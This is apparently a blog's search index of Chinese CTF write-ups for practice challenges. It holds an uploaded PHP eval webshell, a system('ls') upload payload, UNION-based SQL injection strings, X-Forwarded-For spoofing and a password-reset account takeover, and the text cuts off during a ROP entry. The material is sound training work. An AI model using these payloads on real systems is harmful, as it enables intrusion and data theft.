<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>giveyouflag</title>
      <link href="/2019/11/18/giveyouflag/"/>
      <url>/2019/11/18/giveyouflag/</url>
      
        <content type="html"><![CDATA[<h2 id="src-攻防世界-give-you-flag"><a href="#src-攻防世界-give-you-flag" class="headerlink" title="[src = 攻防世界] give_you_flag"></a>[src = 攻防世界] give_you_flag</h2><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p>菜狗找到了文件中的彩蛋很开心，给菜猫发了个表情包<br> <a id="more"></a></p><h3 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h3><p>打开图片，发现似乎有个二维码。通过工具（gif分离器）将各帧分离。得到52张图片，其中第49张包含一个二维码，但是缺少了3个定位符。手动添加，扫码即可。</p>]]></content>
      
      
      <categories>
          
          <category> MISC </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 信息隐藏 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ext3</title>
      <link href="/2019/11/18/ext3/"/>
      <url>/2019/11/18/ext3/</url>
      
        <content type="html"><![CDATA[<h2 id="src-攻防世界-ext3"><a href="#src-攻防世界-ext3" class="headerlink" title="[src = 攻防世界] ext3"></a>[src = 攻防世界] ext3</h2><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p>今天是菜狗的生日，他收到了一个linux系统光盘<br> <a id="more"></a></p><h3 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h3><p>将下载附件放到linux系统查看file格式，如下：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Downloads<span class="comment"># file 630a886233764ec2a63f305f318c8baa </span></span><br><span class="line">630a886233764ec2a63f305f318c8baa: Linux rev 1.0 ext3 filesystem data, UUID=cf6d7bff-c377-403f-84ae-956ce3c99aaa</span><br></pre></td></tr></table></figure><p>再strings查看一下有没有flag这样的字符串：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Downloads<span class="comment"># strings 630a886233764ec2a63f305f318c8baa |grep flag</span></span><br><span class="line">.flag.txt.swp</span><br><span class="line">flag.txtt.swx</span><br><span class="line">~root/Desktop/file/O7avZhikgKgbF/flag.txt</span><br><span class="line">.flag.txt.swp</span><br><span class="line">flag.txtt.swx</span><br><span class="line">.flag.txt.swp</span><br><span class="line">flag.txtt.swx</span><br></pre></td></tr></table></figure><p>flag应该在flag.txt中。</p><p>挂载光盘：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Downloads<span class="comment"># mount 630a886233764ec2a63f305f318c8baa /mnt</span></span><br><span class="line">root@kali:~/Downloads<span class="comment"># cd /mnt</span></span><br><span class="line">root@kali:/mnt<span class="comment"># ls</span></span><br><span class="line">02CdWGSxGPX.bin  0Xs    4A           8HhWfV9nK1  gtj        i             KxEQM           LvuGM       n              OOoOs      Q          rhZE1LZ6g   SPaK8l2sYN</span><br><span class="line">0GY1l            1      6JR3         8nwg        h          imgLDPt4BY    LG6F            lWIRfzP     NgzQPW         orcA       qkCN8      Ruc9        SrZznhSAj</span><br><span class="line">0h3a5            2X     6wUaZE1vbsW  8RxQG4bvd   H          ix1EMRHRpIc2  Lh              m           Nv             oSx2p      QmUY1d     RZTOGd      t</span><br><span class="line">0l               3      7H7geLlS5    FinD        H2Zj8FNbu  j6uLMX        LlC6Z0zrgy.bin  m9V0lIaElz  o              OT         QQY3sF63w  scripts     T</span><br><span class="line">0qsd             3J     8A2MFawD4    fm          hdi7       jE            LO0J8           MiU         O7avZhikgKgbF  poiuy7Xdb  r          sdb.cramfs  TFGVOSwYd.txt</span><br><span class="line">0wDq5            44aAm  8DQFirm0D    g           hYuPvID    jj            lost+found      Mnuc        o8             px6u       Raf3SYj    sn</span><br><span class="line">root@kali:/mnt<span class="comment"># cd O7avZhikgKgbF/</span></span><br><span class="line">root@kali:/mnt/O7avZhikgKgbF<span class="comment"># ls</span></span><br><span class="line">flag.txt</span><br><span class="line">root@kali:/mnt/O7avZhikgKgbF<span class="comment"># cat flag.txt</span></span><br><span class="line">ZmxhZ3tzYWpiY2lienNrampjbmJoc2J2Y2pianN6Y3N6Ymt6an0=</span><br></pre></td></tr></table></figure><p>一串base64，解码即可得到flag。</p>]]></content>
      
      
      <categories>
          
          <category> MISC </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ext3 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ics04</title>
      <link href="/2019/11/18/ics04/"/>
      <url>/2019/11/18/ics04/</url>
      
        <content type="html"><![CDATA[<h2 id="src-攻防世界-ics-04"><a href="#src-攻防世界-ics-04" class="headerlink" title="[src = 攻防世界] ics-04"></a>[src = 攻防世界] ics-04</h2><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p>工控云管理系统新添加的登录和注册页面存在漏洞，请找出flag。<br> <a id="more"></a></p><h3 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h3><p>题目提示登录和注册页面存在漏洞，随便注册一个账号登录，提示“普通用户登录成功,没什么用”。那就看看存不存在SQL注入吧。</p><p>对注册页面和登录页面使用sqlmap进行测试，对于POST方法对测试可以按照如下方法进行，首先使用burp抓包，然后使用“copy to file”功能将请求保存，然后sqlmap -r 文件名即可。比如保存对文件为sq.txt，则使用的sqlmap命令为sqlmap -r sq.txt.</p><p>或者对于POST数据使用–data参数，比如POST数据为username=bitsec，则可以使用如下sqlmap命令：<br>sqlmap -u “***” –data=”username=bitsec”.</p><p>测试所有页面，发现找回密码处有注入,并得到user表里面对数据为：</p><p><img src="./ics041.PNG" alt="isc04"><br>但是无法爆破出来密码。</p><p>但是我们发现注册页面可以重新注册用户，且没有任何验证。所以我们重新注册该用户c3tlwDmIn23，并登录得到flag。</p>]]></content>
      
      
      <categories>
          
          <category> WEB </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL注入，逻辑错误 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>http-header</title>
      <link href="/2019/11/18/http-header/"/>
      <url>/2019/11/18/http-header/</url>
      
        <content type="html"><![CDATA[<h2 id="修改HTTP头的方法"><a href="#修改HTTP头的方法" class="headerlink" title="修改HTTP头的方法"></a>修改HTTP头的方法</h2><ol><li>使用浏览器插件，比如Firefox的Tamper Data。如图：</li></ol><p><img src="./httpheader1.PNG" alt="http-head"></p><ol start="2"><li>CURL（KALI内置）添加修改头部信息，比如添加文件头：</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># curl -H 'x-Forwarded-For: 123.123.123.123' -H 'referer: https://www.google.com' http://111.198.29.45/</span></span><br></pre></td></tr></table></figure><p>添加Referrer头可以直接使用-e参数，所以上面的命令可以等同于</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># curl -H 'x-Forwarded-For: 123.123.123.123' -e 'https://www.google.com' http://111.198.29.45/</span></span><br></pre></td></tr></table></figure><p>关于CURL使用参考：<a href="https://catonmat.net/cookbooks/curl" target="_blank" rel="noopener">https://catonmat.net/cookbooks/curl</a></p><ol start="3"><li>基于Burp抓包修改：</li></ol><p><img src="./httpheader2.PNG" alt="http-head"></p>]]></content>
      
      
      <categories>
          
          <category> WEB </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HTTP </tag>
            
            <tag> HEADER </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>bug</title>
      <link href="/2019/11/18/bug/"/>
      <url>/2019/11/18/bug/</url>
      
        <content type="html"><![CDATA[<h2 id="src-攻防世界-bug"><a href="#src-攻防世界-bug" class="headerlink" title="[src = 攻防世界] bug"></a>[src = 攻防世界] bug</h2><h3 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h3><p>进入弹窗提示“Please Login！”，然后显示登陆框。随便注册一个账号。如图：</p><p><img src="./bug1.PNG" alt="bug"></p><p>然后登录成功。但没有发现大的问题。重点关注首页对Findpwd功能，因为密码修改对逻辑错误经常导致安全问题，因此对修改密码过程进行抓包，如下图：</p><p><img src="./bug2.PNG" alt="bug"></p><p>点击reset后，进入burp抓包界面，如下图：</p><p><img src="./bug3.PNG" alt="bug"></p><p>将其中的username修改为admin，然后forward。发现密码修改成功。如图，基于admin账号登录成功。</p><p><img src="./bug4.PNG" alt="bug"></p><p>点击manage页面，但是页面显示“IP Not allowed！”。这应该是只允许在内网才能访问管理页面，现在是外网，该功能不能使用，因此通过修改X-Forwarded-For头为127.0.0.1，来欺骗系统，进入管理页面。显示</p><p><img src="./bug5.PNG" alt="bug"></p><p>查看源文件，发现页面对注释中包含：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- index.php?module=filemanage&amp;do=???--&gt;</span></span><br></pre></td></tr></table></figure><p>访问该网页：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://111.198.29.45:55218/index.php?module=filemanage&amp;do=upload</span><br></pre></td></tr></table></figure><p>发现文件上传页面，如图：</p><p><img src="./bug6.PNG" alt="bug"></p><p>提示只能上次image，上传下面的php代码（这是文件内容绕过，所以不能使用”&lt;?php ?&gt;”）：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">"php"</span>&gt;</span>system('ls');<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>抓包后修改后缀为php5（php4也可以，但是直接修改为php不允许）。</p><p><img src="./bug7.PNG" alt="bug"></p><p>弹窗得到flag。</p>]]></content>
      
      
      <categories>
          
          <category> WEB </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 逻辑错误 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>upload1</title>
      <link href="/2019/11/17/upload1/"/>
      <url>/2019/11/17/upload1/</url>
      
        <content type="html"><![CDATA[<h2 id="src-攻防世界-upload1"><a href="#src-攻防世界-upload1" class="headerlink" title="[src = 攻防世界] upload1"></a>[src = 攻防世界] upload1</h2><h3 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h3><p>明显的文件上传漏洞。本题是基于js的前段校验。代码如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">upfile = <span class="built_in">document</span>.getElementById(<span class="string">"upfile"</span>);</span><br><span class="line">submit = <span class="built_in">document</span>.getElementById(<span class="string">"submit"</span>);</span><br><span class="line">name = upfile.value;</span><br><span class="line">ext = name.replace(<span class="regexp">/^.+\./</span>,<span class="string">''</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>([<span class="string">'jpg'</span>,<span class="string">'png'</span>].contains(ext))&#123;</span><br><span class="line">    submit.disabled = <span class="literal">false</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    submit.disabled = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    alert(<span class="string">'请选择一张图片文件上传!'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>只允许jpg和png格式，但是我们知道前段校验可以非常容易对绕过。我们首先写一个一句话木马：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_POST[<span class="string">'bitsec'</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>然后将文件后缀改为jpg，然后设置代理，通过burp进行抓包，如图</p><p><img src="./upload11.PNG" alt="upload1"></p><p>将其中的后缀改为php，然后forward即可上传成功，如图。</p><p><img src="./upload12.PNG" alt="upload1"></p><p>页面回显：upload success : upload/1573961293.123.php </p><p>通过中国菜刀等webshell工具连接成功，如图：</p><p><img src="./upload13.PNG" alt="upload1"></p><p>访问目录，发现flag.php文件，打开就得到flag：</p><p><img src="./upload14.PNG" alt="upload1"></p>]]></content>
      
      
      <categories>
          
          <category> WEB </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文件上传，一句话木马，webshell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP2</title>
      <link href="/2019/11/17/PHP2/"/>
      <url>/2019/11/17/PHP2/</url>
      
        <content type="html"><![CDATA[<h2 id="src-攻防世界-PHP2"><a href="#src-攻防世界-PHP2" class="headerlink" title="[src = 攻防世界] PHP2"></a>[src = 攻防世界] PHP2</h2><h3 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h3><p>熟悉php的应该知道phps文件可以用来读取php代码，这里就是可以看到此问题导致对源码泄露，直接访问index.phps，得到源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="string">"admin"</span>===$_GET[id]) &#123;</span><br><span class="line">  <span class="keyword">echo</span>(<span class="string">"&lt;p&gt;not allowed!&lt;/p&gt;"</span>);</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$_GET[id] = urldecode($_GET[id]);</span><br><span class="line"><span class="keyword">if</span>($_GET[id] == <span class="string">"admin"</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;p&gt;Access granted!&lt;/p&gt;"</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;p&gt;Key: xxxxxxx &lt;/p&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">Can you anthenticate to this website?</span><br></pre></td></tr></table></figure><p>需要满足两个条件：<br>第一步，要使得”admin”===$_GET[id]不成立</p><p>第二步，经过$_GET[id] = urldecode($_GET[id]);，使得$_GET[id] == “admin”成立。</p><p>看似矛盾，关键在理解urldecode函数的行为，其解释为解码给出的已编码字符串中的任何 %##。 加号（’+’）被解码成一个空格字符。</p><p>因为当将URL传递给$_GET[id]时，会进行第一次url解码，这时要求不能解码得到admin，然后再次交给urldecode进行url解码，这次要得到admin。<br>所以构造下面对payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=%<span class="number">2561</span>dmin</span><br></pre></td></tr></table></figure><p>第一次url解码得到（将%25解码成%）：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=%<span class="number">61</span>dmin</span><br></pre></td></tr></table></figure><p>此时满足了第一步的条件。然后第二次交给urldecode函数，这次将%61解码成字符a，变为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=admin</span><br></pre></td></tr></table></figure><p>满足第二步条件，得到flag。</p>]]></content>
      
      
      <categories>
          
          <category> WEB </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 信息泄露，URL编码与解码 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Training-WWW-Robots</title>
      <link href="/2019/11/17/Training-WWW-Robots/"/>
      <url>/2019/11/17/Training-WWW-Robots/</url>
      
        <content type="html"><![CDATA[<h2 id="src-攻防世界-Training-WWW-Robots"><a href="#src-攻防世界-Training-WWW-Robots" class="headerlink" title="[src = 攻防世界] Training-WWW-Robots"></a>[src = 攻防世界] Training-WWW-Robots</h2><h3 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h3><p>都提示Robots了，直接访问：<br>&lt;网址&gt;/robots.txt<br>得到</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: /fl0g.php</span><br><span class="line"></span><br><span class="line">User-agent: Yandex</span><br><span class="line">Disallow: *</span><br></pre></td></tr></table></figure><p>然后访问/fl0g.php得到flag</p>]]></content>
      
      
      <categories>
          
          <category> WEB </category>
          
      </categories>
      
      
        <tags>
            
            <tag> robots </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>lottery</title>
      <link href="/2019/11/16/lottery/"/>
      <url>/2019/11/16/lottery/</url>
      
        <content type="html"><![CDATA[<h2 id="src-攻防世界-lottery"><a href="#src-攻防世界-lottery" class="headerlink" title="[src = 攻防世界] lottery"></a>[src = 攻防世界] lottery</h2><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3> <a id="more"></a><h3 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h3><p>打开界面我们知道，要拿到flag，就要赢到足够的钱，其实一开始我以为可以找到一个地方直接修改余额什么的，把网页源代码中的文件看了几个都没发现突破口……</p><p>尝试了一下robots.txt，想看看有没有什么文件，然后发现了：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: /.git/</span><br></pre></td></tr></table></figure><p>应该是git源码泄露，下载GitHack（<a href="https://github.com/lijiejie/GitHack）" target="_blank" rel="noopener">https://github.com/lijiejie/GitHack）</a>，并进行源码下载。（其实本题还提供了源码附件，直接下载就可以了）</p><p>发现在源码api.php中买彩票对关键代码：</p><p><img src="./lottery2.PNG" alt="lottery"></p><p>可以看到$numbers 来自用户json输入 {“action”:”buy”,”numbers”:”1122334”}，没有检查数据类型。 $win_numbers 是随机生成的数字字符串。</p><p>使用 PHP 弱类型松散比较，以”1”为例，和TRUE,1,”1”相等。 由于 json 支持布尔型数据，因此可以抓包改包，构造数据：</p><p>原来数据包为：</p><p><img src="./lottery3.PNG" alt="lottery"></p><p>修改后为：</p><p><img src="./lottery4.PNG" alt="lottery"></p><p>经过2-3次对购买彩票，就可以达到购买flag的余额。直接购买就得到flag：</p><p><img src="./lottery5.PNG" alt="lottery"></p>]]></content>
      
      
      <categories>
          
          <category> WEB </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计，源码泄露 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>isc-06</title>
      <link href="/2019/11/16/isc-06/"/>
      <url>/2019/11/16/isc-06/</url>
      
        <content type="html"><![CDATA[<h2 id="src-攻防世界-isc-06"><a href="#src-攻防世界-isc-06" class="headerlink" title="[src = 攻防世界] isc-06"></a>[src = 攻防世界] isc-06</h2><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p>云平台报表中心收集了设备管理基础服务的数据，但是数据被删除了，只有一处留下了入侵者的痕迹。<br> <a id="more"></a></p><h3 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h3><p>进入题目，发现只有报表中心可以打开，发现一个列表页面。URL中有?id=1。可能是SQL注入。但测试发现不是。题目提示数据被删除，但留下了一点痕迹。所以考虑id为某个值对数据被保留，其他被删除了。所以考虑爆破id字段。</p><p>用Burp抓包，并对id字段进行爆破，讲payload type设置为Numbers，如图：</p><p><img src="./isc1.PNG" alt="isc"></p><p>爆破到id=2333时得到flag。</p><p><img src="./isc2.PNG" alt="isc"></p>]]></content>
      
      
      <categories>
          
          <category> WEB </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 爆破 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>cat</title>
      <link href="/2019/11/16/cat/"/>
      <url>/2019/11/16/cat/</url>
      
        <content type="html"><![CDATA[<h2 id="src-攻防世界-cat"><a href="#src-攻防世界-cat" class="headerlink" title="[src = 攻防世界] cat"></a>[src = 攻防世界] cat</h2><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p>抓住那只猫<br> <a id="more"></a></p><h3 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h3><p>首先按照题目要求，输入一个任意域名，发现没有反应，输入一个IP地址，显示了PING命令对结果。初步考虑命令执行。<br>输入“127.0.0.1|ls”，提示“Invalid URL”，看来增加了过滤，直接执行命令不可行。</p><p>在URL的传参处?url=这里，我们传递个%79发现传递之后变成了?url=w，看来是可以传递url编码，系统会接受并进行解析，于是我们传递%80会出现报错，url编码使用的是16进制，80也就是128，ASCII码是从0-127，所以这个时候会报错。url编码表可以参考<a href="http://www.w3school.com.cn/tags/html_ref_urlencode.html" target="_blank" rel="noopener">http://www.w3school.com.cn/tags/html_ref_urlencode.html</a></p><p>在报错信息里面发现这个应用的整体架构：我们给php发出请求，php把请求发送给本地部署的django，然后得到结果。而且从报错页面发现了database信息：/opt/api/database.sqlite3</p><p>由于django本地部署，而且php使用的cURL组件，所以这里，我们使用前面讲的php的cURL文件上传，但需要以@开头。</p><p><img src="./cat1.png" alt="cat"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=@/opt/api/database.sqlite3</span><br></pre></td></tr></table></figure><p>然后在报错也没搜索CTF得到flag。</p>]]></content>
      
      
      <categories>
          
          <category> WEB </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>NewsCenter</title>
      <link href="/2019/11/16/NewsCenter/"/>
      <url>/2019/11/16/NewsCenter/</url>
      
        <content type="html"><![CDATA[<h2 id="src-攻防世界-NewsCenter"><a href="#src-攻防世界-NewsCenter" class="headerlink" title="[src = 攻防世界] NewsCenter"></a>[src = 攻防世界] NewsCenter</h2><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p>如题目环境报错，稍等片刻刷新即可<br> <a id="more"></a></p><h3 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h3><p>题目显示一个Search news，随便输入几个数字会发现下面的显示结果变化。输入“1’”程序报错，所以基本确认存在SQLi。下面利用Union查询，测试显示对列数。<br>输入payload：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">11111<span class="string">' union select 1,2,3 #</span></span><br></pre></td></tr></table></figure><p>显示如下：</p><p><img src="./newscenter1.PNG" alt="newcenter"></p><p>发现有三列，并输出第二列和第三列。则可以利用这两列获取数据库信息，payload如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">111111<span class="string">' union select 1,TABLE_SCHEMA,TABLE_NAME from INFORMATION_SCHEMA.COLUMNS #</span></span><br></pre></td></tr></table></figure><p>在最下面发现secret_table。然后表内信息：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">11111111<span class="string">' union select 1,column_name,data_type from information_schema.columns where table_name='</span>secret_table<span class="string">'#</span></span><br></pre></td></tr></table></figure><p>发现一个fl4g字段。然后显示该字段得到flag：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">111111<span class="string">' union select 1,2,fl4g from secret_table #</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WEB </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQLi </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>view_source</title>
      <link href="/2019/11/15/view-source/"/>
      <url>/2019/11/15/view-source/</url>
      
        <content type="html"><![CDATA[<h2 id="src-攻防世界-view-source"><a href="#src-攻防世界-view-source" class="headerlink" title="[src = 攻防世界] view source"></a>[src = 攻防世界] view source</h2><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p>X老师让小宁同学查看一个网页的源代码，但小宁同学发现鼠标右键好像不管用了。<br> <a id="more"></a></p><h3 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h3><p>打开题目，右键查看源代码失效。原因是js代码禁用了右键。<br>两种方法：</p><ol><li>使用F12查看；</li><li>在设置里面禁用js。</li></ol><p>以Chrome为例，在设置–&gt;隐私设置和安全性–&gt;网站设置–&gt;JavaScript设置为禁用，则就可以使用右键！查看到flag</p>]]></content>
      
      
      <categories>
          
          <category> WEB </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cookie </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>dafuq-manager-1</title>
      <link href="/2019/11/15/dafuq-manager-1/"/>
      <url>/2019/11/15/dafuq-manager-1/</url>
      
        <content type="html"><![CDATA[<h2 id="src-hackme-dafuq-manager-系列"><a href="#src-hackme-dafuq-manager-系列" class="headerlink" title="[src = hackme] dafuq-manager 系列"></a>[src = hackme] dafuq-manager 系列</h2><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>dafuq-manager 1：Login as guest and find flag 1<br>dafuq-manager 2：Login as admin, code review and get flag 2<br> <a id="more"></a></p><h2 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h2><h3 id="dafuq-manager-1"><a href="#dafuq-manager-1" class="headerlink" title="dafuq-manager 1"></a>dafuq-manager 1</h3><p>首先根据提示以guest用户登录，看到一个文件列表，发现里面有一个see-me-if-you-need-tips.txt文件，打开提示：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Do you know cookie? Create a cookie named `<span class="built_in">help</span>` with value `me`!</span><br></pre></td></tr></table></figure><p>要我们修改cookie，按照要求通过Firefox的Tamper data插件截获并修改插件得到弹窗提示：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Very good. You know how to create cookie. How about tamper a cookie?</span><br></pre></td></tr></table></figure><p>说明思路正确，我们去查看原来对cookie，发现里面有一个“show_hidden=no”，我们将其改为yes，刷新页面，发现多了两个文件：<br>“.good.job.here.is.your.hidden.flag-1.txt”和“.where-is-flag-2-please-tell-me.txt”。</p><p>其中第一个文件中包含flag。第二个文件内容为“Try to login as admin! and you will get flag2”</p><h3 id="dafuq-manager-2"><a href="#dafuq-manager-2" class="headerlink" title="dafuq-manager 2"></a>dafuq-manager 2</h3><p>文件目录下还有一个文件为“source-code-in-dafuqManager.7z-please-download-it.txt”。意思是下载源码，所以这是典型对代码审计题目。</p><h2 id="知识点"><a href="#知识点" class="headerlink" title="[知识点]"></a>[知识点]</h2><p>Cookie</p>]]></content>
      
      
      <categories>
          
          <category> WEB </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cookie </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>rop</title>
      <link href="/2019/10/15/rop/"/>
      <url>/2019/10/15/rop/</url>
      
        <content type="html"><![CDATA[<h2 id="src-hackme-rop"><a href="#src-hackme-rop" class="headerlink" title="[src = hackme] rop"></a>[src = hackme] rop</h2><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc hackme.inndy.tw 7704</span><br></pre></td></tr></table></figure><p>Tips: Buffer Overflow, ROP</p> <a id="more"></a><h2 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h2><p>用IDA打开下载的rop可执行文件，发现在overflow()函数里面的gets()调用处存在栈溢出。且溢出的变量在ebp-Ch的位置，所以举例返回地址为0xC+0x4的举例，即16个字节，也就是要在返回地址前面覆盖16个字节的任意数据。</p><p><img src="./rop1.PNG" alt="rop"></p><p>用checksec查看安全机制开启情况：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">bitsec@bitsec-ubuntu:~/hackme/rop$ checksec rop</span><br><span class="line">[*] <span class="string">'/home/bitsec/hackme/rop/rop'</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE 